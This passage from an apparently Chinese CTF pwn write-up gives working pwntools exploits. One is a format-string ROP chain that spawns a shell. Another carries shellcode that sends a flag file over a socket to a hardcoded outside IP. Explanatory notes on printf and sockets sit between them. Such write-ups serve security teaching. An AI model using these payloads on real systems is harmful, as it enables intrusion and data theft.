addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(script):</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">p=process(elf_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">4</span>:],<span class="number">16</span>)-<span class="number">12</span></span><br><span class="line">leak(<span class="string">&quot;stack&quot;</span>,stack)</span><br><span class="line">dbg()</span><br><span class="line">payload=<span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%hn&quot;</span>.<span class="built_in">format</span>(stack-<span class="number">90</span>).encode()</span><br><span class="line">written=stack&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> written&lt;=<span class="number">0x23</span>:</span><br><span class="line">n=<span class="number">0x23</span>-written</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n=<span class="number">0x100</span>-written+<span class="number">0x23</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>(n).encode()</span><br><span class="line">payload+=<span class="string">b&#x27;%9$p%13$p&#x27;</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">r(<span class="number">90</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line">leak(<span class="string">&quot;libc&quot;</span>,libc.address)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">text=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x11a9</span></span><br><span class="line">leak(<span class="string">&quot;text:&quot;</span>,text)</span><br><span class="line"></span><br><span class="line">payload=</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>别人的<strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;/bin/tmux&quot;</span>,<span class="string">&quot;sp&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">sh, data</span>):</span><br><span class="line">    data = data.ljust(<span class="number">0x100</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_data</span>(<span class="params">sh, atk_addr, write_data</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">x</span>):</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> target_addr <span class="keyword">in</span> <span class="built_in">range</span>(atk_addr, atk_addr + <span class="built_in">len</span>(write_data), <span class="number">2</span>):</span><br><span class="line">        idx = target_addr - atk_addr</span><br><span class="line">        part_data = u16(write_data[idx: idx + <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(main) + <span class="string">&quot;%39$hhn&quot;</span></span><br><span class="line">        payload += build((target_addr + <span class="number">0x10000</span> - main) &amp; <span class="number">0xFFFF</span>) + <span class="string">&quot;%27$hn&quot;</span></span><br><span class="line">        fmt(sh, payload)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(main) + <span class="string">&quot;%39$hhn&quot;</span></span><br><span class="line">        payload += build((part_data + <span class="number">0x10000</span> - main) &amp; <span class="number">0xFFFF</span>) + <span class="string">&quot;%41$hn&quot;</span></span><br><span class="line">        fmt(sh, payload)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x23</span></span><br><span class="line">retn = <span class="number">0xC4</span></span><br><span class="line"><span class="comment"># sh = process(&#x27;./fmt&#x27;)</span></span><br><span class="line">sh = remote(sys.argv[<span class="number">1</span>], <span class="number">9999</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Gift: &#x27;</span>)</span><br><span class="line">stack_ret = <span class="built_in">int</span>(sh.recvline(), <span class="number">16</span>) - <span class="number">0xC</span></span><br><span class="line">log.success(<span class="string">&quot;stack_ret:\t&quot;</span> + <span class="built_in">hex</span>(stack_ret))</span><br><span class="line"></span><br><span class="line">first = <span class="string">&quot;%c&quot;</span> * <span class="number">9</span></span><br><span class="line">first += <span class="string">&quot;%&#123;&#125;c%hn&quot;</span>.<span class="built_in">format</span>((stack_ret-<span class="number">9</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">first += <span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>((main - stack_ret) &amp; <span class="number">0xFF</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">fmt(sh, first)</span><br><span class="line"><span class="comment"># sh.interactive()</span></span><br><span class="line"></span><br><span class="line">fmt(sh, <span class="string">&quot;%&#123;&#125;c%39$hhn%9$p%11$p\n&quot;</span>.<span class="built_in">format</span>(main &amp; <span class="number">0xFF</span>))</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">0x24083</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:\t&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">stack = <span class="built_in">int</span>(sh.recvline(), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;stack:\t&quot;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">stack_rop = stack - <span class="number">0x108</span></span><br><span class="line">pop_rdi_addr = libc_base + <span class="number">0x23b6a</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b45bd</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x52290</span></span><br><span class="line">write_data(sh, stack_rop, p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr))</span><br><span class="line">fmt(sh, <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(retn) + <span class="string">&quot;%39$hhn&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="printf的一个细节问题"><a href="#printf的一个细节问题" class="headerlink" title="printf的一个细节问题"></a>printf的一个细节问题</h2><p>看两段代码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%11$hn&quot;</span>.<span class="built_in">format</span>(stack).encode()</span><br><span class="line">written=stack&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> written&lt;=<span class="number">0x23</span>:</span><br><span class="line">n=<span class="number">0x23</span>-written</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n=<span class="number">0x100</span>-written+<span class="number">0x23</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>(n).encode()</span><br><span class="line">payload+=<span class="string">b&#x27;%9$p%13$p&#x27;</span></span><br><span class="line">s(payload)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%hn&quot;</span>.<span class="built_in">format</span>(stack-<span class="number">90</span>).encode()</span><br><span class="line">written=stack&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> written&lt;=<span class="number">0x23</span>:</span><br><span class="line">n=<span class="number">0x23</span>-written</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n=<span class="number">0x100</span>-written+<span class="number">0x23</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>(n).encode()</span><br><span class="line">payload+=<span class="string">b&#x27;%9$p%13$p&#x27;</span></span><br></pre></td></tr></table></figure><p>这两段代码的目的,都是两次连接修改来写printf的返回地址</p><p>且效果上看过去是一致的,但实际上<u>第一段代码并不能按照预期工作</u>,仅仅是修改了第一部分的指针，确实做出了一个指向 <code>printf</code> 返回地址的指针，但第二部分通过刚刚做出的指针并没有成功修改掉 <code>printf</code> 函数的返回地址</p><p>原理暂时不清楚,但得出的结论是,要像这样通过修改中间指针来指向修改某一个内存,<u>连接过程不能两个都是用<code>$</code>写法</u>,其中一个得是利用正常顺序排列得出</p><h3 id="非-格式化顺序"><a href="#非-格式化顺序" class="headerlink" title="非$格式化顺序"></a>非$格式化顺序</h3><p><strong>非$指定的%参数单独计数</strong>,按顺序对应各个参数</p><p>例如<code>printf(&quot;%d%2$d%d&quot;,1,2,3)</code></p><p>打印结果是122,即$不加入普通参数的记数</p><p>在本题中就选择以9个%p和1个%c填充,使得%hn对应相对格式化字符串的第11个参数</p><h1 id="2022鹏城杯-ezthree"><a href="#2022鹏城杯-ezthree" class="headerlink" title="2022鹏城杯-ezthree"></a>2022鹏城杯-ezthree</h1><p><strong>标签:socket</strong>本地进程间通信</p><p>这题感觉挺有意思,但怎么都找不到附件下载</p><p>不过好在程序很简单,直接就着别人的wp也勉强能行</p><p>保护是全部开启</p><p>前面的代码分析了一坨,结果发现最后压根用不上</p><p>真正有用的代码只有下面这段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(shellcode, <span class="number">0x90</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( LODWORD(s[<span class="number">5</span>]) )<span class="comment">//要满足这个条件只需要在开始输入的时候进行一些溢出即可</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_E10(<span class="string">&quot;You want to do sometings ?\n&quot;</span>);</span><br><span class="line">  readshellcode((<span class="type">char</span> *)shellcode + <span class="number">4056</span>, <span class="number">40LL</span>);</span><br><span class="line">  close(<span class="number">0</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(shellcode, &amp;unk_203010, <span class="number">0x3D</span>uLL);</span><br><span class="line">  shellcode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点关注这串代码,先是读入shellcode然后关闭了标准流,导致没有任何输出</p><p>然后还会在shellcode处开始处移入这一串代码</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-03-11_194732.png" alt=""></p><p>这导致了除了rip以外所有的寄存器都被清空了,特别是rsp,这使得我们几乎无法正常运行有用的代码</p><p>这里可以利用到一个知识点fs寄存器存储着tls结构</p><p><strong>fs:[0x300]存储着一个栈指针</strong>,因此可以利用这个进行恢复rsp</p><p>之后利用mprotect修改栈权限,并在之前的输入中提前输入一些汇编代码,之后调试获得偏移就能执行更多代码了</p><p>但现在还有一个非常致命的问题,文件的所有流都被关闭了,这意味着无论是getshell还是orw都无法获得输出</p><p>因此这里用到了一个socket通信的技巧</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote(&#x27;114.116.233.171&#x27;,8888)</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;ret&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zero</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;zero&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nop</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;nop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jmp</span>(<span class="params">addr</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;jmp&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">movrax</span>(<span class="params">addr</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;movrax&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;b *$rebase(0x185E)&quot;)</span></span><br><span class="line"></span><br><span class="line">serv_addr = <span class="number">0x420001</span> <span class="comment"># serv_addr</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax, 41</span></span><br><span class="line"><span class="string">mov rdi, 2</span></span><br><span class="line"><span class="string">mov rsi, 1</span></span><br><span class="line"><span class="string">mov rdx, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">mov rcx, 0xABE97472EE260002</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">mov rax, 42</span></span><br><span class="line"><span class="string">mov rdx, 0x10</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp $+0x32</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;b&quot;</span>*<span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">shellcode+=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">xchg rdi, rax</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0x50</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(shellcode+<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">shell=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rsp, fs:[0x300]</span></span><br><span class="line"><span class="string">push 0x1000</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 7</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 0xA</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">and rdi, 0xFFFFFFFFFFFFF000</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">sub rsp,0x67</span></span><br><span class="line"><span class="string">jmp rsp</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.send(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>再在服务器上监听对应的端口<code>nc -l 9988</code>,可见顺利接收到了flag</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/DKI55Y39LLRTHAEB@9BO%7DOX.png" alt=""></p><h2 id="socket通信"><a href="#socket通信" class="headerlink" title="socket通信"></a>socket通信</h2><p>只针对这题用到的客户端</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __sys_socket(<span class="type">int</span> family, <span class="type">int</span> type, <span class="type">int</span> protocol)</span><br></pre></td></tr></table></figure><p>第一个参数和第三个参数,协议族</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Supported address families. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_UNSPEC0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_UNIX1<span class="comment">/* Unix domain sockets */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_LOCAL1<span class="comment">/* POSIX name for AF_UNIX*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_INET2<span class="comment">/* Internet IP Protocol */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_AX253<span class="comment">/* Amateur Radio AX.25 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IPX4<span class="comment">/* Novell IPX */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_APPLETALK5<span class="comment">/* AppleTalk DDP */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NETROM6<span class="comment">/* Amateur Radio NET/ROM */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_BRIDGE7<span class="comment">/* Multiprotocol bridge */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ATMPVC8<span class="comment">/* ATM PVCs*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_X259<span class="comment">/* Reserved for X.25 project */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_INET610<span class="comment">/* IP version 6*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ROSE11<span class="comment">/* Amateur Radio X.25 PLP*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_DECnet12<span class="comment">/* Reserved for DECnet project*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NETBEUI13<span class="comment">/* Reserved for 802.2LLC project*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_SECURITY14<span class="comment">/* Security callback pseudo AF */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_KEY15      <span class="comment">/* PF_KEY key management API */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NETLINK16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ROUTEAF_NETLINK <span class="comment">/* Alias to emulate 4.4BSD */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_PACKET17<span class="comment">/* Packet family*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ASH18<span class="comment">/* Ash*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ECONET19<span class="comment">/* Acorn Econet*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ATMSVC20<span class="comment">/* ATM SVCs*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_RDS21<span class="comment">/* RDS sockets */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_SNA22<span class="comment">/* Linux SNA Project (nutters!) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IRDA23<span class="comment">/* IRDA sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_PPPOX24<span class="comment">/* PPPoX sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_WANPIPE25<span class="comment">/* Wanpipe API Sockets */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_LLC26<span class="comment">/* Linux LLC*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IB27<span class="comment">/* Native InfiniBand address*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_MPLS28<span class="comment">/* MPLS */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_CAN29<span class="comment">/* Controller Area Network      */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_TIPC30<span class="comment">/* TIPC sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_BLUETOOTH31<span class="comment">/* Bluetooth sockets */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IUCV32<span class="comment">/* IUCV sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_RXRPC33<span class="comment">/* RxRPC sockets */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ISDN34<span class="comment">/* mISDN sockets */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_PHONET35<span class="comment">/* Phonet sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IEEE80215436<span class="comment">/* IEEE802154 sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_CAIF37<span class="comment">/* CAIF sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ALG38<span class="comment">/* Algorithm sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NFC39<span class="comment">/* NFC sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 